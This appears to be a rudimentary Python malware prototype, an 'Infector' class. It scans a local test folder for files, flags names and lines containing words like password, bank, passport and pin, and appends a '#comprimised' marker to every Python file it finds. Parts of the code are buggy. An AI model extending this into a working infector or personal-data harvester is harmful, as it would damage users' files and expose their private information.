import os
import re


class Infector:
    def __init__(self):
        self.files = {}

    def findFiles(self, extension):
        filesFound = []
        for files in os.walk(r"C:\Users\asadk\Documents\TEST"):  # TODO os.walk
            for file in files[2]:
                if file.split(".")[-1] == extension.lower():
                    #print("File found: " + files[0] + "\\" + file + "\n")
                    filesFound.append(files[0] + "\\" + file)
                    self.files[extension.lower()] = filesFound
    
    def getTotalNumberOfFiles(self):
        total = 0
        for key in self.files:
            total += len(self.files[key])
        self.files['total'] = str(total)
        return total

    def searchVulnerableFileNames(self):
        temp = 0
        vulnerablestrings = [
            "password",
            "account",
            "statement",
            "bank",
            "passport",
            "drivers liscense",
            "pin",
        ]
        for q in self.files:
            for file in q.queue:
                if str(file.split("\\")[-1].split(".")[0]) in vulnerablestrings:
                    print(
                        "Vulnerable File name:",
                        "'{}'".format(file.split("\\")[-1].split(".")[0]),
                    )
                    temp += 1
                    self.findVulnerablitiesInTxt(file)
        return temp

    def findVulnerablitiesInTxt(self, file):
        FH = [x.strip() for x in open(file, "r").readlines()]
        vulnerablestrings = [
            "password",
            "account",
            "statement",
            "bank",
            "passport",
            "drivers liscense",
            "pin",
        ]
        for sentence in FH:
            for string in vulnerablestrings:
                x = re.findall("(?i)({}):*s*".format(string), sentence)
                if x != []:
                    print(x)
    
    def infectPyFiles(self):
        print(self.files['py'])
        for file in self.files['py']:
            try:
                FH = open(file, "a")
                FH.write('\n' + '''#comprimised''')
                FH.close()
            except:
                pass